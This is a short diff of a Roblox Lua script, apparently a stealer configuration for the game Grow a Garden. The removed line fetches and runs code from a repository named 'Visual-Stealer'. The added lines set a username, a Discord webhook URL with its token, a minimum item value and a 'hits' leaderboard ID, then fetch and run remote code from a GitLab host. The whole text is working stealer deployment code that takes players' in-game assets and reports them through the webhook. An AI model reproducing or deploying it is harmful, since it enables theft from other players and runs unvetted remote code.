@@ -1,1 +1,6 @@
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Jay-star-bep/Visual-Stealer/refs/heads/main/LONG"))()
+Username = "supermegabaconv17"
+Webhook = "https://discord.com/api/webhooks/1405126211390148629/Cv7UNWcLPp5q6W9xwgcy3r9cl7eZFsC2sJeUW1bfhWmOYSsJSEiuKbLR_fWkIamCnUAT"
+MinimumValue = 1
+DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
